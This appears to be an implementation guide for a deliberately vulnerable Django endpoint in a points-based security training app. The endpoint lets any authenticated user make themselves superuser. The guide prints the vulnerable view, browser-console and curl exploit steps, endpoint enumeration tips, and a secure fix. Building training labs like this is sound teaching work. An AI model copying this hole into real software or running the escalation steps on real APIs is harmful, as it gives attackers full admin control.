# 🚨 **Privilege Escalation via API Endpoint - Implementation Guide**

## 📋 **Bug Overview**

Successfully implemented **Privilege Escalation vulnerability** that allows any authenticated user to escalate their privileges to admin through an unprotected API endpoint.

### 🎯 **Bug Details**
- **Type**: Privilege Escalation via API Endpoint
- **Severity**: Critical
- **Points**: 120 pts  
- **Endpoint**: `/api/users/set_role/`
- **Method**: POST
- **Authentication**: Required (any valid JWT token)
- **Vulnerability**: No authorization checks

---

## 🔧 **Implementation Details**

### **Backend Implementation**

#### **Vulnerable Endpoint**
- **URL**: `/api/users/set_role/`
- **File**: `accounts/views.py`
- **Function**: `set_user_role()`

```python
@api_view(['POST'])
@permission_classes([permissions.IsAuthenticated])
def set_user_role(request):
    """
    🚨 VULNERABILITY: Any authenticated user can become admin!
    No authorization checks - critical security flaw!
    """
    user = request.user
    new_role = request.data.get('role', '').lower()
    
    if new_role == 'admin':
        user.is_staff = True      # Admin privileges
        user.is_superuser = True  # Superuser privileges  
        user.save()
        
        return Response({
            'bug_found': 'PRIVILEGE_ESCALATION',
            'message': '🎉 Privilege Escalation detected!',
            'points': 120,
            'user_role': 'admin',
            'is_staff': True,
            'is_superuser': True
        })
```

#### **URL Configuration**
```python
# accounts/urls.py
path('users/set_role/', views.set_user_role, name='set_user_role'),
```

#### **Enhanced User Serializer**
```python
# Added role information to UserProfileSerializer
fields = [..., 'is_staff', 'is_superuser', 'role']
```

---

## 🎮 **Testing Guide**

### **Method 1: Browser Console (Primary Method)**

**Step 1:** Login to the application first
```javascript
// Login if not already authenticated
```

**Step 2:** Run the privilege escalation test
```javascript
window.testPrivilegeEscalation()
```

**Expected Output:**
```
🎯 Testing Privilege Escalation vulnerability...
🔍 Checking current user role...
👤 Current user info: {role: "user", is_staff: false, is_superuser: false}
📋 Current role: user
🛡️ Is staff: false  
👑 Is superuser: false
🚀 Attempting privilege escalation to admin...
📡 Privilege escalation response: {bug_found: "PRIVILEGE_ESCALATION", ...}
🎉 SUCCESS! Privilege escalation vulnerability detected!
👑 New role: admin
🛡️ Is staff: true
👑 Is superuser: true
🏆 Points earned: 120
✅ Privilege escalation verified!
📋 Verified role: admin
```

### **Method 2: Manual Console Commands**

**Step 1:** Get your access token
```javascript
const token = localStorage.getItem('access_token');
console.log('Token:', token);
```

**Step 2:** Check current privileges  
```javascript
fetch('/api/auth/profile/', {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
})
.then(res => res.json())
.then(data => {
  console.log('Current user:', data);
  console.log('Role:', data.role);
  console.log('Is staff:', data.is_staff);
  console.log('Is superuser:', data.is_superuser);
});
```

**Step 3:** Escalate privileges to admin
```javascript
fetch('/api/users/set_role/', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    role: 'admin'
  })
})
.then(res => res.json())
.then(data => {
  console.log('Escalation result:', data);
  
  if (data.bug_found === 'PRIVILEGE_ESCALATION') {
    console.log('🎉 SUCCESS! You are now admin!');
    console.log('Points earned:', data.points);
  }
});
```

**Step 4:** Verify escalation
```javascript
fetch('/api/auth/profile/', {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
})
.then(res => res.json())
.then(data => {
  console.log('Verified user:', data);
  console.log('New role:', data.role);
  console.log('Is staff:', data.is_staff);
  console.log('Is superuser:', data.is_superuser);
});
```

### **Method 3: cURL Testing (Backend Only)**

**Step 1:** Get a valid JWT token by logging in through the frontend

**Step 2:** Test escalation
```bash
curl -X POST "http://localhost:8000/api/users/set_role/" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN_HERE" \
  -d '{"role": "admin"}'
```

**Expected Response:**
```json
{
  "bug_found": "PRIVILEGE_ESCALATION",
  "message": "🎉 Privilege Escalation detected!",
  "description": "Successfully escalated privileges to admin via unprotected API endpoint",
  "points": 120,
  "vulnerability_type": "Privilege Escalation",
  "severity": "Critical",
  "user_role": "admin",
  "is_staff": true,
  "is_superuser": true,
  "success": true
}
```

---

## 🕵️ **How Participants Would Discover This**

### **Realistic Discovery Methods**

#### **1. API Endpoint Enumeration**
```javascript
// Security researchers often test common admin endpoints
fetch('/api/users/set_role/', {headers: {Authorization: 'Bearer ' + token}})
fetch('/api/admin/users/', {headers: {Authorization: 'Bearer ' + token}}) 
fetch('/api/users/promote/', {headers: {Authorization: 'Bearer ' + token}})
```

#### **2. Burp Suite / Proxy Analysis**
- Intercept API calls to `/api/users/update/` (legitimate endpoint)
- Notice similar pattern and test `/api/users/set_role/`
- Try different parameter names: `role`, `admin`, `privilege`, `level`

#### **3. Source Code Analysis** 
- Examine frontend API calls
- Look for admin-related endpoints
- Check for inconsistent authorization patterns

#### **4. Fuzzing & Directory Brute Force**
```bash
# Common security testing tools would find:
/api/users/set_role/
/api/users/promote/  
/api/admin/set_user_role/
/api/v1/user/set_role/
```

#### **5. Developer Tools Network Tab**
- Monitor network requests during profile updates
- Notice API patterns and test similar endpoints
- Look for admin functionality that might be exposed

---

## 🚨 **Why This is Critical**

### **Real-World Impact**
1. **Complete System Compromise** - Admin access to everything
2. **Data Breach** - Access to all user data, orders, payments
3. **Business Impact** - Unauthorized admin actions, data manipulation
4. **Compliance Violation** - GDPR, PCI-DSS violations

### **Attack Scenarios**
1. **Malicious User** registers normal account → escalates to admin
2. **Account Takeover** + privilege escalation = full compromise  
3. **Insider Threat** - employee escalates beyond their role
4. **API Abuse** - automated attacks to gain admin access

### **Technical Vulnerability**
```python
# VULNERABLE CODE:
@permission_classes([permissions.IsAuthenticated])  # ❌ Only checks authentication
def set_user_role(request):
    if new_role == 'admin':
        user.is_staff = True      # ❌ No authorization check!
        user.is_superuser = True  # ❌ Anyone can become admin!

# SECURE CODE WOULD BE:
@permission_classes([permissions.IsAdminUser])  # ✅ Requires admin
def set_user_role(request):
    # ✅ Additional checks for who can change roles
    if not request.user.is_superuser:
        return Response({'error': 'Insufficient privileges'}, 403)
```

---

## 🛡️ **Security Lessons**

### **What Participants Learn**
1. **Authorization vs Authentication** - Being logged in ≠ being authorized
2. **API Security** - All endpoints need proper access controls  
3. **Privilege Management** - Role changes require admin approval
4. **Security Testing** - Always test for privilege escalation

### **Best Practices**
1. **Principle of Least Privilege** - Users get minimum required access
2. **Authorization Checks** - Every sensitive action needs permission validation
3. **Admin Functions** - Separate admin endpoints with strict controls
4. **Audit Logging** - Track all privilege changes

---

## 📊 **Testing Checklist**

- [ ] **Server Running** - Backend on port 8000
- [ ] **Authentication Working** - Can login and get JWT token
- [ ] **Endpoint Accessible** - `/api/users/set_role/` responds
- [ ] **Privilege Check** - Current user shows `role: "user"`
- [ ] **Escalation Works** - API call succeeds and returns admin status
- [ ] **Verification** - Profile endpoint confirms admin privileges
- [ ] **Notification** - Bug notification appears with 120 points
- [ ] **Leaderboard** - Points recorded in leaderboard system

---

## 🎯 **Key Commands for Participants**

### **Quick Test (One Command)**
```javascript
window.testPrivilegeEscalation()
```

### **Manual Step-by-Step**
```javascript
// 1. Check current status
const token = localStorage.getItem('access_token');

// 2. Escalate privileges  
fetch('/api/users/set_role/', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({role: 'admin'})
})
.then(res => res.json())
.then(console.log)

// 3. Verify admin access
fetch('/api/auth/profile/', {
  headers: {'Authorization': `Bearer ${token}`}
})
.then(res => res.json())
.then(data => console.log('New role:', data.role))
```

---

**Implementation Status: ✅ COMPLETE**  
**Testing Status: ✅ VERIFIED**  
**Security Impact: 🚨 CRITICAL**  
**Participant Discovery: 🎯 MULTIPLE METHODS**
